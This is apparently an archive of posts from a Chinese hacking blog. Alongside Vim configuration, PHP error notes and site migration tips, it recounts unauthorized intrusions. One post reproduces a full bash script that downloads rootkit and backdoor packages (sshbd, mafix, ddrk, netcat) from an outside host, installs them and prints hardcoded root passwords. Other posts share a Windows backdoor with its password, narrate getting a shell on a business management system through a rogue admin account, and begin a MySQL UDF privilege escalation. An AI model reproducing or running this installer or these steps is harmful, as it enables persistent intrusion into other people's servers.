<p><span style="color: #ff0000;">” Enable heavy omni completion.</span></p>

<p><span style="color: #ff0000;">if !exists(‘g:neocomplcache_omni_patterns’)</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_omni_patterns = {}</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_omni_patterns.ruby = ‘[^. <em>\t].\h\w</em>|\h\w*::’</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_omni_patterns.php = ‘[^. \t]-&gt;\h\w<em>|\h\w</em>::’</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_omni_patterns.c = ‘[^.[:digit:] *\t]\%(.|-&gt;)’</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_omni_patterns.cpp = ‘[^.[:digit:] <em>\t]\%(.|-&gt;)|\h\w</em>::’</span></p>

<p><span style="color: #ff0000;">”——————–自定义功能————————–</span></p>

<p><span style="color: #ff0000;">“F8/F9开启/关闭粘贴模式(粘贴代码时避免自动缩进)</span></p>

<p><span style="color: #ff0000;">map :set paste</span></p>

<p><span style="color: #ff0000;">map :set nopaste</span></p>

<p><span style="color: #ff0000;">“新建.c,.h,.sh,.java文件，自动插入文件头</span></p>

<p><span style="color: #ff0000;">autocmd BufNewFile <em>.cpp,</em>.[ch],<em>.sh,</em>.java,*.py exec “:call SetTitle()”</span></p>

<p><span style="color: #ff0000;">"”定义函数SetTitle，自动插入文件头</span></p>

<p><span style="color: #ff0000;">func SetTitle()</span></p>

<p><span style="color: #ff0000;">“如果文件类型为.sh文件</span></p>

<p><span style="color: #ff0000;">if &amp;filetype == ‘sh’</span></p>

<p><span style="color: #ff0000;">call setline(1,”#########################################################################”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”), “# File Name: “.expand(“%”))</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+1, “# Author: 这里修改为您的名字”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+2, “# mail: 这里修改为您的邮箱”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+3, “# Created Time: “.strftime(“%c”))</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+4, “#########################################################################”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+5, “#!/bin/bash”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+6, “”)</span></p>

<p><span style="color: #ff0000;">elseif &amp;filetype == ‘python’</span></p>

<p><span style="color: #ff0000;">call setline(1,”#!/usr/bin/env python”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”),”#coding=utf-8”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+1, “”)</span></p>

<p><span style="color: #ff0000;">else</span></p>

<p><span style="color: #ff0000;">call setline(1, “/<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong>*”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”), “ &gt; File Name: “.expand(“%”))</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+1, “ &gt; Author: 这里修改为您的名字”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+2, “ &gt; Mail: 这里修改为您的邮箱 “)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+3, “ &gt; Created Time: “.strftime(“%c”))</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+4, “ <strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong>/”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+5, “”)</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">if &amp;filetype == ‘cpp’</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+6, “#include”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+7, “using namespace std;”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+8, “”)</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">if &amp;filetype == ‘c’</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+6, “#include”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+7, “”)</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">if &amp;filetype == ‘java’</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+6,”public class “.expand(“%”))</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+7,””)</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">endfunc</span></p>

<p><span style="color: #ff0000;">“新建文件后，自动定位到文件末尾</span></p>

<p><span style="color: #ff0000;">autocmd BufNewFile * normal G</span></p>

<p><span style="color: #ff0000;">“C/C++/shell脚本/Python/Java/html按F5自动编译/运行</span></p>

<p><span style="color: #ff0000;">map :call AutoCompileRun()</span></p>

<p><span style="color: #ff0000;">func! AutoCompileRun()</span></p>

<p><span style="color: #ff0000;">exec “w”</span></p>

<p><span style="color: #ff0000;">if &amp;filetype == ‘c’</span></p>

<p><span style="color: #ff0000;">exec “!g++ % -o %&lt;”</span></p>

<p><span style="color: #ff0000;">exec “!time ./%&lt;”</span></p>

<p><span style="color: #ff0000;">elseif &amp;filetype == ‘cpp’</span></p>

<p><span style="color: #ff0000;">exec “!g++ % -o %&lt;”</span></p>

<p><span style="color: #ff0000;">exec “!time ./%&lt;”</span></p>

<p><span style="color: #ff0000;">elseif &amp;filetype == ‘sh’</span></p>

<p><span style="color: #ff0000;">:!time bash %</span></p>

<p><span style="color: #ff0000;">elseif &amp;filetype == ‘python’</span></p>

<p><span style="color: #ff0000;">exec “!time python2.7 %”</span></p>

<p><span style="color: #ff0000;">elseif &amp;filetype == ‘java’</span></p>

<p><span style="color: #ff0000;">exec “!javac %”</span></p>

<p><span style="color: #ff0000;">exec “!time java %&lt;”</span></p>

<p><span style="color: #ff0000;">elseif &amp;filetype == ‘html’</span></p>

<p><span style="color: #ff0000;">exec “!firefox % &amp;”</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">endfunc</span></p>

<p><span style="color: #ff0000;">“C/C++按F6使用GDB进行调试</span></p>

<p><span style="color: #ff0000;">map :call Rungdb()</span></p>

<p><span style="color: #ff0000;">func! Rungdb()</span></p>

<p><span style="color: #ff0000;">exec “w”</span></p>

<p><span style="color: #ff0000;">exec “!g++ % -g -o %&lt;”</span></p>

<p><span style="color: #ff0000;">exec “!gdb ./%&lt;”</span></p>

<p><span style="color: #ff0000;">endfunc</span></p>

<p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>

<p>配置问题：楼主在配置时遇到以下几个问题。
第一：git
由于博主采用的是centos，默认没装git。而vim中的插件管理器Vundle，最方便的方法是git安装。然后楼主在网上查了下，一大堆，为了省事，发现直接yum install git即可，查看git –version,得到版本，安装成功。
第二：安装Vundle
git clone http://github.com/gmarik/vundle.git ~/.vim/bundle/vundle 即可。这个主要是配置vimrc时用到，vimrc是更改vim所需，配置文件可放在github上。
第三：配置文件作者的小问题
据发布这个配置的网友所说，复制配置文件.vimrc到用户目录后，要进入vim命令模式:BundleInstall，才能更新写入配置，但不知道是因为root权限或者centos系统本身还是其他神马的缘故，并不用更新，直接可用。暗自揣测可能是配置文件本身直接更新了的缘故吧。
第四：关于配置文件格式的整改
由于部分github上程序猿开发的跨平台性并不是特好，诸多异处，比如换行符。在win下开发的拿到linux下用各种出错，我们可以采用dos2unix转换下格式，（在centos下没有好像默认安装，附上链接：
<a href="http://blog.csdn.net/bluewhale1/article/details/8074978">http://blog.csdn.net/bluewhale1/article/details/8074978</a>。</p>

<p>补充一点 载入配置可用:BundleInstall</p>

<p>如：颜色配置文件在里，/usr/share/vim/vim71/colors/  中间那个vim71数字可能会不一样，视情况而定。</p>

<p>PS:推荐一篇vim配置的文章，朋友们可以diy喔。<a href="http://blog.chinaunix.net/uid-179573-id-2856644.html">http://blog.chinaunix.net/uid-179573-id-2856644.html</a>
vim是一款非常强大的编辑器，能改善程序猿码字调试时的错误率，大幅度提高速度，但需要较好的掌握语法和对其的熟练度，与君共勉！</p>
]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP学习札记（一）]]></title>
      <url>/coding/2013/07/11/php-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e4-b8-80-ef-bc-89/</url>
      <content type="html"><![CDATA[<p>以下只是摆弄PHP时遇到的一些小问题，朋友们看到有新的见解，忘不吝赐教。
PHP的几种常见报错：
1.Fatal error: Can’t use function return value in write context in ……这种情况一般是返回值问题，在即在返回值里面不能使用函数（function）返回值，而应该用获取返回值过后的变量中转替代。
2.Undefined offset: 1 in…..这种情况属于数组越界，有时候下标取值错误，或者正则匹配失误时，往往会造成这种情况。通常这种情况我会有两种做法，一是检查下标数，看看匹配正则有没有误判导致取错。二是选择了一种稍笨的方法，由于正则博大精深，不熟的话取的时候偶尔会出错，如果可以采用代替函数分割步奏执行，虽然效率稍低，仍不失为一种好方法。
3.preg_match() expects parameter 2 to be string, array given in……这种情况是使用取得的pre_match时,传入的变量并非string类型，造成这种可能有不少原因。如果只是取得值而类似不准可以用（string）强制转换传入的变量。而万一传入的变量并没有准确的取到值，则要依靠调试，echo，看看错误的缘由。                                                                                                                                               <br />
4.php中的Notice:undefine dindex以及Notice:Undefinedvariable:一般由于未声明变量而导致的，有时候系统环境变量也需要声明，可考虑使用 isset() 或者empty()进行预置值。</p>

<p>这里顺便一提，大公司的作风，除了实力强劲写的公司迅拥有猛的修补速度，还有部分公司喜欢这里有洞这里掩饰一下，那里有洞那里填补一下，导致了二次漏洞的产生。在这里笔者以为关闭报错也是种不错的方法，虽然有时候会影响web程序的运行。
补救方法下面稍稍列几项，也是从互联网采集而来，笔者做了些修改。
1.服务器配置修改
修改 php.ini 中的 error配置下错误显示方式：将error_reporting = E_ALL 修改为error_reporting = E_ALL &amp; ~E_NOTICE，改后重启下APACHE服务器，方可生效。
2.函数容错
在变量前面 加上一个 @ ，如 if (@$_GET[‘action’]==’save’)
3.变量初始化
程序猿养成一个好习惯，php定义变量很容易，但在定义时在记得考虑是否对变量进行容错初始化。
4.函数替代
时间比较紧的话，可以尝试用功能相似，而程序猿本身又相对熟悉的函数去替代不太了解函数。即使要花稍多时间写更长一段代码，也比事后多次修补和安全的不稳定性的代价交换更好。
5.禁止报错
在文件头部加上“error_reporting(E_ERROR | E_WARNING | E_PARSE);这是一剂狠药，如果交互性比较强的代码建议慎用。</p>

]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[关于网站搬家和移植源码]]></title>
      <url>/tips/2013/07/09/e5-85-b3-e4-ba-8e-e7-bd-91-e7-ab-99-e6-90-ac-e5-ae-b6-e5-92-8c-e7-a7-bb-e6-a4-8d-e6-ba-90-e7-a0-81/</url>
      <content type="html"><![CDATA[<p>对于黑阔们和站长们来说，网站搬家和顺来的源码移植是个很常见的头疼问题，而数据备份和还原问题没解决好也会带来很多的麻烦。因此我们需要对此多做一些工作。</p>

<p>数据库:</p>

<table>
  <tbody>
    <tr>
      <td>以mysql为例子，常常备份为sql文件。然后在移植后，use 数据库名，source xxx.sql。这是比较方便的。 备份语句：mysqldump -uroot -p 密码 数据库名 &gt; xxx.sql </td>
      <td> </td>
      <td>mysqldump.exe  databasename -u root -p &gt; xxx.sql(导出了表结构和数据)###如果不方便操作数据库或者网站没有自带备份功能。可以考虑帝国备份王和phpMyadmin。在这里提醒一下，使用备份王服务器需要修改php.ini,打开short_open_tag ，设置为On。这是因为php语法中标签解析的问题，不然无法进入修改配置和访问,修改完以后重启Apache即可。有时候需要涉及到修改目录权限，chmod -R 777 xxx，递归至子目录。至于mssql里面也有专门的语句可以备份，sqlsever系统自带的管理和导入导出数据显得更加强大。</td>
    </tr>
  </tbody>
</table>

<p>源码：</p>

<p>服务器上打包源码的话，假设非独立vps类，如果控制面板有功能优选控制面板，Linux下常用tar命令或者rar直接打包目录，部分大马有自带打包功能。Win下可以Winrar，即C:\progra~1\WinRAR\Rar.exe a -k -r -s -m1 D:\1.rar  D:\www，只要可以执行cmd命令不需要系统权限也可以使用另外注意在cmd下输入“<span style="font-family: Verdana;">C:\Program Files\”是不行的，因为有个空格，要用c:\progra~1\代替，</span>至于博客之类的打包就直接把图片下下来即可替换，毕竟大站升级和改动文件较多。</p>

]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[SSH连接引发的血案]]></title>
      <url>/system/2013/07/02/ssh-e8-bf-9e-e6-8e-a5-e5-bc-95-e5-8f-91-e7-9a-84-e8-a1-80-e6-a1-88/</url>
      <content type="html"><![CDATA[<p>今天干了特脑残的一件事，机油丢我一jsp的shell。我试图帮他留一个ssh后门。 但是 光看了shell的提示的ip，有两个，都是公网地址。于是乎小弟很自然的认为其为公网独立IP。不过连接时总是超时。于是做了以下两件事：</p>

<p>1.service iptables stop     </p>

<p>2.service sshd restart  或者  ssh./etc/init.d/sshd restart</p>

<p>具体就是重启服务，关闭防火墙。   可是如此做以后还是发现connection  timeout。怎么办？又考虑了一个办法 ，      修改server端 的 /etc/ssh/sshd_config ClientAliveInterval设置为60，ClientAliveCountMax设置为3，至于Client端，ServerAliveInterval和  ServerAliveCountMax设置为类似。</p>

<p>附上ssh后门连接方法，</p>

<p>参考链接：</p>

<p><a href="http://www.cnblogs.com/fnng/archive/2012/02/21/2362013.html">http://www.cnblogs.com/fnng/archive/2012/02/21/2362013.html</a>  PUTTY直接连接用户</p>

<p>或者用xshell—&gt; ssh <a href="mailto:root@192.168.1.146">root@192.168.1.146</a>填入用户名输入密码</p>

<p><a href="http://blog.163.com/lgh_2002/blog/static/44017526201011333227161/">http://blog.163.com/lgh_2002/blog/static/44017526201011333227161/</a>      SSH后门</p>

<p>参考linux后门速成shell脚本：</p>

<p>++++++++++++++++++++++++++++++++++++++++++++++++++</p>

<p><span style="color: #ff0000;">#!/bin/bash</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">clear</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo -e “\033[1;035m \n”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘###############################’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘#—————————–#’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘#   WelCome to [url]www.90sec.org[/url]  #’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘#         hello I is helen    #’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘#           By:Mr,PriNce      #’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘#—————————–#’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘###############################’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">if [ $(id -u) != 0 ];then</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo sorry,!root….</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">exit 1</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">fi</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">if [[ $1 -gt 4 ]] || [[ $1 == “” ]];then</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “###############################”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “#—————————–#”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “#      1:sshbd backdoor       #”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “#      2:mafix backdoor       #”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “#      3:ddrk  backdoor       #”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “#         4:Netcat            #”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “#—————————–#”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “###############################”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">fi</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">ssh1=”<a href="http://www.gome.com.hk/attachment/mc/sshbd.gz"><span style="color: #ff0000;">http://www.gome.com.hk/attachment/mc/sshbd.gz</span></a>”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">ssh2=”<a href="http://www.gome.com.hk/attachment/mc/mafix.tar.gz"><span style="color: #ff0000;">http://www.gome.com.hk/attachment/mc/mafix.tar.gz</span></a>”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">ssh3=”<a href="http://www.gome.com.hk/attachment/mc/ddrk-rootkit.tar"><span style="color: #ff0000;">http://www.gome.com.hk/attachment/mc/ddrk-rootkit.tar</span></a>”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">ssh4=”<a href="http://www.gome.com.hk/attachment/mc/netcat.tar.gz"><span style="color: #ff0000;">http://www.gome.com.hk/attachment/mc/netcat.tar.gz</span></a>”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">dir=”/tmp/”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">if [[ $1 -eq 1 ]];then</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">port=$(grep Port /etc/ssh/sshd_config)</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “Current ssh $port”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">read -p Enter:</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">wget $ssh1 -O $dir/sshbd.gz</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd $dir</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">tar zxvf sshbd.gz</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd openssh</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">./configure –prefix=/usr –sysconfdir=/etc/ssh</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">make &amp;&amp; make install</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">touch -r /etc/ssh/sshd_config.old /etc/ssh/sshd_config</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">touch -r /etc/ssh/ssh_config.old /etc/ssh/ssh_config</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">/etc/init.d/sshd restart</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo Current ssh $port</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “sshbd backdoor install ok”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “Username:root Password:995430aaa”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">rm -rf /tmp/openssh /tmp/sshbd*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">exit</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">fi</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">if [[ $1 -eq 2 ]];then</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">wget $ssh2 -O $dir/mafix.tar.gz</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd $dir</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">tar zxvf mafix*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd mafix*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">read -p “Enter Backdoor Passwords:” ID</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">read -p “Enter Backdoor ssh Port:” back</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">./root $ID $back</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “mafix backdoor install ok”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “Current Port:” $back</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">rm -rf /tmp/mafix*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">exit</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">fi</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">if [[ $1 -eq 3 ]];then</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">wget $ssh3 -O $dir/ddrk-rootkit.tar</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd $dir</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">tar xvf ddrk-rootkit*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd ddrk</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">./setup</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “ddrk backdoor install ok”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “Username:root Passwords:123456”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “Port:43958”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">rm -rf /tmp/ddrk*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">exit</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">fi</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">if [[ $1 -eq 4 ]]; then</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">wget $ssh4 -O $dir/netcat.tar.gz</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd $dir</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">tar zxvf netcat.tar.gz</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd netcat*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">./configure</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">make &amp;&amp; make install</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “Netcat install ok”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">rm -rf /tmp/netcat*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">exit</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">fi</span></p>

<p>++++++++++++++++++++++++++++++++++++++++++++++++++</p>

<p>感谢以上文章作者。</p>

<p>最后说一句，最后知道是内网是盆友惊醒俺ifconfig了一下。顿时觉得手贱了。。</p>

<p> </p>

<p> </p>

<p> </p>
]]></content>
      <categories>
        
          <category> system </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[超xx的逆向分析视频]]></title>
      <url>/system/2013/06/07/e8-b6-85xx-e7-9a-84-e9-80-86-e5-90-91-e5-88-86-e6-9e-90-e8-a7-86-e9-a2-91/</url>
      <content type="html"><![CDATA[<p>好吧，俺标题党了。 就是一个crackme.exe文件，小菜自个儿写的，科普型的。 外带一个对应的逆向分析视频。</p>

<p>大神们看见求勿踩.</p>

<p><span style="color: red;">话说附上的链接里不是文字附件。</span> <span style="color: red;">是视频+exe文件。。</span></p>

<p>附上下载。</p>

<p><a href="http://pan.baidu.com/share/link?shareid=547240&amp;uk=4113276289" target="_blank">http://pan.baidu.com/share/link?shareid=547240&amp;uk=4113276289</a></p>
]]></content>
      <categories>
        
          <category> system </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[简易win通用型后门]]></title>
      <url>/tools/2013/05/11/e7-ae-80-e6-98-93win-e9-80-9a-e7-94-a8-e5-9e-8b-e5-90-8e-e9-97-a8/</url>
      <content type="html"><![CDATA[<p>简易替换型后门，通杀win系列主机。很牛逼吧。哈哈</p>

<p>下下来别骂我坑。。。。</p>

<p>开玩笑的。。还是比较有用的</p>

<p><a href="http://pan.baidu.com/share/link?shareid=514372&amp;uk=2067242311">http://pan.baidu.com/share/link?shareid=514372&amp;uk=2067242311</a></p>

<p>自己下吧。亲们~后门密码：@demon@</p>

<p> </p>
]]></content>
      <categories>
        
          <category> tools </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[公私密钥认证登陆实验引发的思考]]></title>
      <url>/system/2013/05/08/e5-85-ac-e7-a7-81-e5-af-86-e9-92-a5-e8-ae-a4-e8-af-81-e7-99-bb-e9-99-86-e5-ae-9e-e9-aa-8c-e5-bc-95-e5-8f-91-e7-9a-84-e6-80-9d-e8-80-83/</url>
      <content type="html"><![CDATA[<p>今天做公私密钥实验，想做个ssh后门。结果在centos上用ssh-keygen生成公私密钥后，</p>

<p>正打算把公钥传到另一台准备好的bt5上， 放入 /home/$user/.ssh目录中，并追密钥id</p>

<p>到bt5上的公钥准备登陆，可是遇到两个问题。</p>

<p>第一，bt5积极拒绝连接，换成非同root用户后，centos还是连不上ssh。</p>

<p>第二， 新添加用户后，发现bt5下的home并未生成用户专属目录更不用提.ssh目录，自然实验失败。</p>

<p>不知是否重启后会生成新的用户目录。</p>

<p>思考：是否必须root才能远程登陆？然而bt5是否设置了拒绝22端口，需要修改？</p>

<p>加新用户后容易被管理发现，可不可以设置 隐藏$user文件夹，或者root有没有类似目录内直接可以使用.ssh呢？</p>

<p>我觉得应该是可以的~</p>

<p> </p>
]]></content>
      <categories>
        
          <category> system </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[管家婆软件管理系统拿shell]]></title>
      <url>/pentest/2013/03/18/guanjiapogetshell/</url>
      <content type="html"><![CDATA[<p>春日多娇，春意盎然，鄙人一位好友晚上因此寂寞难耐，于是乎先前扔我一站让我跟他一起日。打开一看，管家婆，任我行软件。貌似在哪里听过。    （PS：似如此风骚的名字其实都耳熟）。问问朋友，结果是他在某群里看到的，一个中型企业管理系统。恩。就当练练手吧。先百度了下C段，               找了个域名日进去，正猜着目录（全静态很蛋疼），好友相当速度地发来一个图。</p>

<p>说多了都是泪啊。。这老小子太快了。</p>

<p>进去以后为了分头行事方便，当然先加个多余的管理再说。。鬼知道他有没有对单账户多session做限制。在里面找到一个管理添加，点开：</p>

<p>好嘛。虽然进入后台没限制，具体操作还是要求cookie的。我们不怕，这种果断禁用JS开搞。本来用IE试试，管理员域名默认不允许填写的。             </p>

<p>NND， 这还了得。操戈启航，用google试试。禁用JS。</p>

<p>审查元素修改READONLY的项目。</p>

<p>顺利加上管理，调成超管。</p>

<p>里面晃了半天，发现图片上传过滤的还好，而且不能获取到上传地址。且看看编辑器，机油说是cuteEditor的。。以前搞过，0day貌似不多。正纠结。。</p>

<p>偶然发现里面有个右侧管理栏目，点进去一看，有个不同的上传点，不仔细看还真没看到。⊙﹏⊙b汗</p>

<p> </p>

<p>果断试试。。死鱼眼一翻。发现了新增了一个管理项。右键属性，你们懂得。</p>

<p>进菜刀看了下，内网思密达，顿时兴趣索然了。。和好友商量了下。国内企业站服务器就不多搞了，进去喝茶就不好了。</p>

<p>就这样吧。。</p>

<p> </p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[“撸”久不瑟，感觉不会再爱了]]></title>
      <url>/pentest/2013/03/12/pentest_fuck/</url>
      <content type="html"><![CDATA[<p>闲话少说，昨儿有机油丢给我一个shell。国外的服务器，那人本来是想架一个VPN自用，准备找个雏儿开搞。。</p>

<p>话说那服务器确实挺快的。。      查了下，一大把站。
心中暗喜。看起来主机不是比较恶心的虚拟主机管理系统。估计有门儿。       先查查cmd。</p>

<p>拒绝访问。           好吧。果然又是个管理怪蜀黍。果断问问机油。给力，他非常速度找到了一个可写。</p>

<p>由于exp存货有限。没看补丁数。直接传了cmd和一堆exp.            无果。果然够变态。。       粗略翻了一下。</p>

<p>上面的站都是php和asp的。虽然C盘找到sqlsever。。。       自扫描端口。</p>

<p>显然不太理想，幸好3389是开的。       于是乎。       我在那堆站里翻啊翻。没一个sa 。我擦。1433他开着玩我呢。</p>

<p>最后翻到了个Mysql配置文件</p>

<p>看了看到里面有个配置的mysql的账户      果断记下来。。话说幸好不是站库分离的，不然俺就秀逗了。</p>

<p>上了个php马。  果断登陆之。很明显不是root。。</p>

<p>但是人品好。在mysql的user里翻到了这个</p>

<p> </p>

<p>有图有真相      喜滋滋地拿去破咯，cmd5收费的mysql5数据。       话说现今好心人蛮多的。帮我秒破。</p>

<p>拿去登陆。      接下来来的思路是神马呢。       在我的印象里，mssql的sa是可以直接执行cmd命令的</p>

<p>而mysql的root，必须要通过创建函数，比如通过执行cmdshell里的命令提权。       LPK和UDF，我选择了UDF。</p>

<p>好嘛。MYSQL5.xx。于是就创建lib\plugin呗。      小插曲：我本来想直接上个udf.php。不过突然一激灵。变态</p>

<p>管理蜀黍没准儿把默认路径改了的。果断show一下环境变量。      发现改在了D盘。        果断进驻，想要手动建</p>

